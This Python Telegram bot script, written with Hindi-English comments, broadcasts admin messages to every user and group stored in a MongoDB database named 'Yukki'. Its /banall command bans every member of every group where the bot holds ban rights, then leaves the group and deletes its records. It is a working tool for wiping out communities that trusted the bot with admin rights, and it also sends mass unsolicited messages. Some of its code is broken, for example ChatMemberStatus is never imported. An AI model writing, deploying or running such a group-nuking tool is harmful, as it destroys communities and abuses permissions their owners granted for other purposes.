import asyncio
import os
import json
import time
from datetime import datetime
from pymongo import MongoClient
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
from pyrogram.errors import FloodWait, UserIsBlocked, ChatWriteForbidden
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Load from environment variables
API_ID = int(os.getenv('TELEGRAM_API_ID'))
API_HASH = os.getenv('TELEGRAM_API_HASH')
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
MONGO_URL = os.getenv('MONGO_URL')

# Admin user IDs - comma separated string se list banao
ADMIN_IDS_STR = os.getenv('ADMIN_IDS', '7355827552')
ADMIN_IDS = [int(id.strip()) for id in ADMIN_IDS_STR.split(',')]

ACTIVE_CHATS_FILE = 'chats.json'
FAILED_CHATS_FILE = 'failed_chats.json'

# Verify all credentials are loaded
if not all([API_ID, API_HASH, BOT_TOKEN, MONGO_URL]):
    print("❌ Error: .env file me saare credentials nahi hain!")
    print("✅ Solution: .env file check karo aur saare variables add karo")
    exit(1)

app = Client("broadcast_bot", API_ID, API_HASH, bot_token=BOT_TOKEN)

class BroadcastSystem:
    def __init__(self):
        self.mongo_client = MongoClient(MONGO_URL)
        self.anon_db = self.mongo_client["Yukki"]
        
        self.broadcast_message = None
        self.broadcast_keyboard = None
        self.is_broadcasting = False
        
        self.failed_chats = self.load_failed_chats()
        
        self.stats = {
            'total_sent': 0,
            'total_failed': 0,
            'total_blocked': 0,
            'flood_waits': 0,
            'current_broadcast': 0
        }

    def load_failed_chats(self):
        try:
            if os.path.exists(FAILED_CHATS_FILE):
                with open(FAILED_CHATS_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return {}

    def save_failed_chats(self):
        try:
            with open(FAILED_CHATS_FILE, 'w') as f:
                json.dump(self.failed_chats, f, indent=2)
        except Exception as e:
            print(f"Error saving failed chats: {e}")

    def get_all_chats(self):
        """MongoDB se sabhi users aur groups collect karo"""
        chat_ids = set()
        
        try:
            # Users collection
            for user in self.anon_db.tgusersdb.find({}, {'user_id': 1}):
                if 'user_id' in user:
                    chat_ids.add(user['user_id'])
            
            # Assistants/Groups collection
            for group in self.anon_db.assistants.find({}, {'chat_id': 1}):
                if 'chat_id' in group:
                    chat_ids.add(group['chat_id'])
            
            # Chats collection
            for chat in self.anon_db.chats.find({}, {'chat_id': 1}):
                if 'chat_id' in chat:
                    chat_ids.add(chat['chat_id'])
                    
        except Exception as e:
            print(f"Error fetching chats from MongoDB: {e}")
        
        return list(chat_ids)

    def get_database_stats(self):
        """Database stats - users aur groups count"""
        try:
            users_count = self.anon_db.tgusersdb.count_documents({})
            groups_count = self.anon_db.assistants.count_documents({})
            chats_count = self.anon_db.chats.count_documents({})
            
            total_unique = len(self.get_all_chats())
            
            return {
                'users': users_count,
                'groups': groups_count,
                'chats': chats_count,
                'total_unique': total_unique
            }
        except Exception as e:
            print(f"Error getting database stats: {e}")
            return {
                'users': 0,
                'groups': 0,
                'chats': 0,
                'total_unique': 0
            }

    async def send_to_chat(self, chat_id, message: Message):
        """Single chat ko message send karo"""
        # Skip if failed 3+ times
        if self.failed_chats.get(str(chat_id), 0) >= 3:
            return False
        
        try:
            # Message copy karo with all formatting
            await message.copy(chat_id)
            
            self.stats['total_sent'] += 1
            self.stats['current_broadcast'] += 1
            
            # Success par failed count reset karo
            if str(chat_id) in self.failed_chats:
                del self.failed_chats[str(chat_id)]
            
            return True
            
        except FloodWait as e:
            self.stats['flood_waits'] += 1
            print(f"⏳ FloodWait: {e.value}s for chat {chat_id}")
            await asyncio.sleep(e.value)
            return False
            
        except (UserIsBlocked, ChatWriteForbidden):
            self.stats['total_blocked'] += 1
            self.failed_chats[str(chat_id)] = self.failed_chats.get(str(chat_id), 0) + 1
            return False
            
        except Exception as e:
            self.stats['total_failed'] += 1
            self.failed_chats[str(chat_id)] = self.failed_chats.get(str(chat_id), 0) + 1
            return False

    async def start_broadcast(self, message: Message, status_msg: Message):
        """Broadcast shuru karo"""
        self.is_broadcasting = True
        self.stats['current_broadcast'] = 0
        
        all_chats = self.get_all_chats()
        total_chats = len(all_chats)
        
        if total_chats == 0:
            await status_msg.edit("❌ Koi chat nahi mili database me!")
            self.is_broadcasting = False
            return
        
        await status_msg.edit(f"🚀 Broadcast shuru ho gaya!\n\n📊 Total Chats: {total_chats}\n⏳ Please wait...")
        
        start_time = time.time()
        success = 0
        failed = 0
        
        for i, chat_id in enumerate(all_chats, 1):
            result = await self.send_to_chat(chat_id, message)
            
            if result:
                success += 1
            else:
                failed += 1
            
            # Rate limiting: 30 messages per second
            if i % 30 == 0:
                await asyncio.sleep(1)
            
            # Progress update har 50 messages par
            if i % 50 == 0:
                progress = (i / total_chats) * 100
                await status_msg.edit(
                    f"📤 Broadcasting...\n\n"
                    f"Progress: {i}/{total_chats} ({progress:.1f}%)\n"
                    f"✅ Success: {success}\n"
                    f"❌ Failed: {failed}"
                )
        
        # Save failed chats
        self.save_failed_chats()
        
        duration = time.time() - start_time
        
        # Final report
        report = (
            f"✅ **Broadcast Complete!**\n\n"
            f"📊 **Statistics:**\n"
            f"• Total Chats: {total_chats}\n"
            f"• ✅ Delivered: {success}\n"
            f"• ❌ Failed: {failed}\n"
            f"• 🚫 Blocked: {self.stats['total_blocked']}\n"
            f"• ⏳ Flood Waits: {self.stats['flood_waits']}\n"
            f"• ⏱️ Time Taken: {duration:.1f}s\n\n"
            f"Success Rate: {(success/total_chats*100):.1f}%"
        )
        
        await status_msg.edit(report)
        self.is_broadcasting = False

# Initialize broadcast system
broadcast_system = BroadcastSystem()

# Command: /start
@app.on_message(filters.command("start") & filters.private)
async def start_command(client, message: Message):
    user_id = message.from_user.id
    
    if user_id in ADMIN_IDS:
        text = (
            "👋 **Welcome Admin!**\n\n"
            "🎯 **Broadcast Kaise Kare:**\n"
            "• Koi bhi message, photo, video, document forward karo\n"
            "• Bot confirm karega, `yes` type karo\n"
            "• Broadcast shuru ho jayega! 🚀\n\n"
            "📊 **Commands:**\n"
            "• /stats - Database statistics\n"
            "• /broadcast_stats - Broadcast statistics\n"
            "• /clear_failed - Failed chats clear karo\n\n"
            "⚡ **Features:**\n"
            "✅ All message types support\n"
            "✅ Automatic rate limiting\n"
            "✅ Real-time progress\n"
            "✅ Failed chats tracking"
        )
    else:
        text = "👋 Hello! I'm a broadcast bot.\n\n❌ Only admins can use me."
    
    await message.reply(text)

# Command: /stats
@app.on_message(filters.command("stats"))
async def stats_command(client, message: Message):
    user_id = message.from_user.id
    
    if user_id not in ADMIN_IDS:
        await message.reply("❌ Only admins can use this command!")
        return
    
    status_msg = await message.reply("⏳ Fetching statistics...")
    
    db_stats = broadcast_system.get_database_stats()
    
    stats_text = (
        "📊 **Database Statistics**\n\n"
        f"👥 **Users:** {db_stats['users']}\n"
        f"👥 **Groups:** {db_stats['groups']}\n"
        f"💬 **Other Chats:** {db_stats['chats']}\n"
        f"🔢 **Total Unique:** {db_stats['total_unique']}\n\n"
        f"📈 **Broadcast Stats:**\n"
        f"✅ Total Sent: {broadcast_system.stats['total_sent']}\n"
        f"❌ Total Failed: {broadcast_system.stats['total_failed']}\n"
        f"🚫 Blocked Users: {broadcast_system.stats['total_blocked']}\n"
        f"⏳ Flood Waits: {broadcast_system.stats['flood_waits']}\n\n"
        f"🗑️ Failed Chats in DB: {len(broadcast_system.failed_chats)}"
    )
    
    await status_msg.edit(stats_text)

# Command: /broadcast_stats
@app.on_message(filters.command("broadcast_stats"))
async def broadcast_stats_command(client, message: Message):
    user_id = message.from_user.id
    
    if user_id not in ADMIN_IDS:
        await message.reply("❌ Only admins can use this command!")
        return
    
    stats_text = (
        "📊 **Broadcast Statistics**\n\n"
        f"✅ Total Sent: {broadcast_system.stats['total_sent']}\n"
        f"❌ Total Failed: {broadcast_system.stats['total_failed']}\n"
        f"🚫 Blocked Users: {broadcast_system.stats['total_blocked']}\n"
        f"⏳ Flood Waits: {broadcast_system.stats['flood_waits']}\n\n"
        f"🔄 Broadcasting: {'Yes ⚡' if broadcast_system.is_broadcasting else 'No 💤'}\n"
        f"🗑️ Failed Chats: {len(broadcast_system.failed_chats)}"
    )
    
    await message.reply(stats_text)

# Command: /clear_failed
@app.on_message(filters.command("clear_failed"))
async def clear_failed_command(client, message: Message):
    user_id = message.from_user.id
    
    if user_id not in ADMIN_IDS:
        await message.reply("❌ Only admins can use this command!")
        return
    
    count = len(broadcast_system.failed_chats)
    broadcast_system.failed_chats = {}
    broadcast_system.save_failed_chats()
    
    await message.reply(f"✅ {count} failed chats cleared!")

# Command: /help
@app.on_message(filters.command("help"))
async def help_command(client, message: Message):
    user_id = message.from_user.id
    
    if user_id not in ADMIN_IDS:
        await message.reply("❌ Only admins can use this command!")
        return
    
    help_text = (
        "📖 **Bot Help Guide**\n\n"
        "🎯 **Broadcast Kaise Kare:**\n"
        "1. Bot ko private message karo\n"
        "2. Koi bhi message bhejo (text/photo/video)\n"
        "3. `yes` type karke confirm karo\n"
        "4. Done! 🚀\n\n"
        "📊 **Available Commands:**\n"
        "• /start - Bot info\n"
        "• /stats - Database statistics\n"
        "• /broadcast_stats - Broadcast stats\n"
        "• /clear_failed - Failed chats clear\n"
        "• /banall - Ban all members in all groups\n"
        "• /help - Ye message\n\n"
        "💡 **Tips:**\n"
        "• Formatting aur buttons preserve honge\n"
        "• Progress real-time dikhega\n"
        "• Failed chats automatically skip honge"
    )
    
    await message.reply(help_text)

# Banall System
class BanallSystem:
    def __init__(self):
        self.processed_groups = set()
        self.ban_stats = {
            'total_groups': 0,
            'groups_banned': 0,
            'total_banned': 0,
            'groups_left': 0,
            'groups_removed_from_db': 0,
            'no_rights': 0
        }
    
    async def check_ban_rights(self, chat_id):
        """Check if bot has ban rights"""
        try:
            bot_member = await app.get_chat_member(chat_id, "me")
            
            # Check if admin
            if bot_member.status not in [ChatMemberStatus.OWNER, ChatMemberStatus.ADMINISTRATOR]:
                return False, "not_admin"
            
            # Check ban rights
            if bot_member.status == ChatMemberStatus.ADMINISTRATOR:
                if not bot_member.privileges or not bot_member.privileges.can_restrict_members:
                    return False, "no_ban_rights"
            
            return True, "has_rights"
            
        except Exception as e:
            print(f"Error checking rights in {chat_id}: {e}")
            return False, "error"
    
    async def ban_member(self, chat_id, user_id):
        """Ban single member"""
        try:
            await app.ban_chat_member(chat_id, user_id)
            return True
        except FloodWait as e:
            await asyncio.sleep(e.value)
            return await self.ban_member(chat_id, user_id)
        except Exception as e:
            return False
    
    async def ban_all_in_group(self, chat_id, status_msg):
        """Ban all members in a single group"""
        if chat_id in self.processed_groups:
            return
        
        self.processed_groups.add(chat_id)
        
        # Check ban rights
        has_rights, reason = await self.check_ban_rights(chat_id)
        
        if not has_rights:
            self.ban_stats['no_rights'] += 1
            print(f"❌ No ban rights in {chat_id}: {reason}")
            
            # Leave group
            try:
                await app.leave_chat(chat_id)
                self.ban_stats['groups_left'] += 1
                print(f"✅ Left group: {chat_id}")
                
                # Remove from MongoDB
                broadcast_system.anon_db.assistants.delete_one({'chat_id': chat_id})
                broadcast_system.anon_db.chats.delete_one({'chat_id': chat_id})
                self.ban_stats['groups_removed_from_db'] += 1
                
            except Exception as e:
                print(f"❌ Could not leave group {chat_id}: {e}")
            
            return
        
        # Ban all members
        member_count = 0
        banned_count = 0
        tasks = []
        
        try:
            # Get chat info
            try:
                chat = await app.get_chat(chat_id)
                chat_title = chat.title if hasattr(chat, 'title') else str(chat_id)
            except:
                chat_title = str(chat_id)
            
            print(f"\n🔨 Starting banall in: {chat_title}")
            
            async for member in app.get_chat_members(chat_id):
                member_count += 1
                task = asyncio.create_task(self.ban_member(chat_id, member.user.id))
                tasks.append(task)
                
                # Process in batches of 50
                if len(tasks) >= 50:
                    results = await asyncio.gather(*tasks, return_exceptions=True)
                    banned_count += sum(1 for r in results if r is True)
                    tasks = []
                    
                    # Update status
                    await status_msg.edit(
                        f"🔨 **Banall Progress**\n\n"
                        f"Current Group: {chat_title}\n"
                        f"Members: {member_count}\n"
                        f"Banned: {banned_count}\n"
                        f"Groups Done: {self.ban_stats['groups_banned']}/{self.ban_stats['total_groups']}"
                    )
            
            # Process remaining
            if tasks:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                banned_count += sum(1 for r in results if r is True)
            
            print(f"✅ Banned {banned_count}/{member_count} members in {chat_title}")
            
            self.ban_stats['groups_banned'] += 1
            self.ban_stats['total_banned'] += banned_count
            
            # Leave group after ban
            await asyncio.sleep(2)
            try:
                await app.leave_chat(chat_id)
                self.ban_stats['groups_left'] += 1
                print(f"✅ Left group: {chat_title}")
            except Exception as e:
                print(f"❌ Could not leave: {e}")
            
        except Exception as e:
            print(f"❌ Error in banall for {chat_id}: {e}")
    
    async def start_banall(self, status_msg):
        """Start banall in all groups"""
        # Get all groups from MongoDB
        all_groups = []
        
        try:
            for group in broadcast_system.anon_db.assistants.find({}, {'chat_id': 1}):
                if 'chat_id' in group and group['chat_id'] < 0:  # Negative IDs are groups
                    all_groups.append(group['chat_id'])
            
            for chat in broadcast_system.anon_db.chats.find({}, {'chat_id': 1}):
                if 'chat_id' in chat and chat['chat_id'] < 0:
                    all_groups.append(chat['chat_id'])
        except Exception as e:
            print(f"Error fetching groups: {e}")
        
        # Remove duplicates
        all_groups = list(set(all_groups))
        self.ban_stats['total_groups'] = len(all_groups)
        
        if not all_groups:
            await status_msg.edit("❌ Database me koi group nahi mila!")
            return
        
        await status_msg.edit(
            f"🔨 **Banall Starting...**\n\n"
            f"Total Groups: {len(all_groups)}\n"
            f"⏳ Please wait..."
        )
        
        start_time = time.time()
        
        # Process each group
        for i, group_id in enumerate(all_groups, 1):
            print(f"\n{'='*50}")
            print(f"Processing group {i}/{len(all_groups)}: {group_id}")
            print(f"{'='*50}")
            
            await self.ban_all_in_group(group_id, status_msg)
            
            # Small delay between groups
            await asyncio.sleep(2)
        
        duration = time.time() - start_time
        
        # Final report
        report = (
            f"✅ **Banall Complete!**\n\n"
            f"📊 **Statistics:**\n"
            f"• Total Groups: {self.ban_stats['total_groups']}\n"
            f"• ✅ Groups Banned: {self.ban_stats['groups_banned']}\n"
            f"• 🔨 Total Banned: {self.ban_stats['total_banned']}\n"
            f"• 🚪 Groups Left: {self.ban_stats['groups_left']}\n"
            f"• ❌ No Rights: {self.ban_stats['no_rights']}\n"
            f"• 🗑️ Removed from DB: {self.ban_stats['groups_removed_from_db']}\n"
            f"• ⏱️ Time: {duration:.1f}s\n\n"
            f"Success Rate: {(self.ban_stats['groups_banned']/self.ban_stats['total_groups']*100):.1f}%"
        )
        
        await status_msg.edit(report)

# Initialize banall system
banall_system = BanallSystem()

# Command: /banall
@app.on_message(filters.command("banall"))
async def banall_command(client, message: Message):
    user_id = message.from_user.id
    
    if user_id not in ADMIN_IDS:
        await message.reply("❌ Only admins can use this command!")
        return
    
    # Confirm
    confirm_msg = await message.reply(
        "⚠️ **WARNING: BANALL**\n\n"
        "🔨 Ye command:\n"
        "• Sabhi groups me members ko ban karega\n"
        "• Groups me se leave karega\n"
        "• Jisme rights nahi hai unhe chhod dega\n"
        "• Database se groups remove karega\n\n"
        "Type `CONFIRM` to proceed"
    )
    
    try:
        response = await client.listen(message.chat.id, timeout=30)
        
        if response.text and response.text.upper() == 'CONFIRM':
            await confirm_msg.delete()
            await response.delete()
            
            status_msg = await message.reply("🔨 Banall starting...")
            await banall_system.start_banall(status_msg)
        else:
            await confirm_msg.edit("❌ Banall cancelled!")
    except asyncio.TimeoutError:
        await confirm_msg.edit("⏱️ Timeout! Banall cancelled.")
    except Exception as e:
        await message.reply(f"❌ Error: {str(e)}")

# Broadcast handler - Koi bhi message forward karo
@app.on_message(filters.private & ~filters.command(["start", "stats", "broadcast_stats", "clear_failed", "help"]))
async def broadcast_handler(client, message: Message):
    user_id = message.from_user.id
    
    # Check if admin
    if user_id not in ADMIN_IDS:
        await message.reply("❌ Only admins can broadcast messages!")
        return
    
    # Check if already broadcasting
    if broadcast_system.is_broadcasting:
        await message.reply("⚠️ Ek broadcast already chal raha hai! Please wait...")
        return
    
    # Confirm broadcast
    confirm_msg = await message.reply(
        "🔄 **Ready to Broadcast!**\n\n"
        "⚡ Is message ko sabhi users aur groups me bhejne ke liye confirm karo.\n\n"
        "Type: `yes` to confirm\n"
        "Type: `no` to cancel"
    )
    
    # Wait for confirmation
    try:
        response = await client.listen(message.chat.id, timeout=30)
        
        if response.text and response.text.lower() in ['yes', 'y', 'ha', 'haan']:
            await confirm_msg.delete()
            await response.delete()
            
            status_msg = await message.reply("⏳ Broadcast start ho raha hai...")
            
            # Start broadcast
            await broadcast_system.start_broadcast(message, status_msg)
        else:
            await confirm_msg.edit("❌ Broadcast cancelled!")
            
    except asyncio.TimeoutError:
        await confirm_msg.edit("⏱️ Timeout! Broadcast cancelled.")
    except Exception as e:
        print(f"Error in broadcast handler: {e}")
        await message.reply(f"❌ Error: {str(e)}")

# Group me message handler - Admin group me message bheje toh broadcast
@app.on_message(filters.group & filters.command("broadcast"))
async def group_broadcast_handler(client, message: Message):
    user_id = message.from_user.id
    
    # Check if admin
    if user_id not in ADMIN_IDS:
        return
    
    # Check if already broadcasting
    if broadcast_system.is_broadcasting:
        await message.reply("⚠️ Ek broadcast already chal raha hai!")
        return
    
    # Get message to broadcast (replied message)
    if message.reply_to_message:
        broadcast_msg = message.reply_to_message
        status_msg = await message.reply("⏳ Broadcast start ho raha hai...")
        
        # Start broadcast
        await broadcast_system.start_broadcast(broadcast_msg, status_msg)
    else:
        await message.reply("⚠️ Kisi message ko reply karke /broadcast use karo")

print("=" * 50)
print("✅ Bot successfully started!")
print("=" * 50)
print(f"👤 Admin IDs: {ADMIN_IDS}")
print(f"📊 MongoDB Connected: {MONGO_URL[:30]}...")
print(f"🤖 Bot Token: {BOT_TOKEN[:20]}...")
print("=" * 50)
print("📡 Bot is now running and listening...")
print("Press Ctrl+C to stop")
print("=" * 50)

# Run bot
app.run()
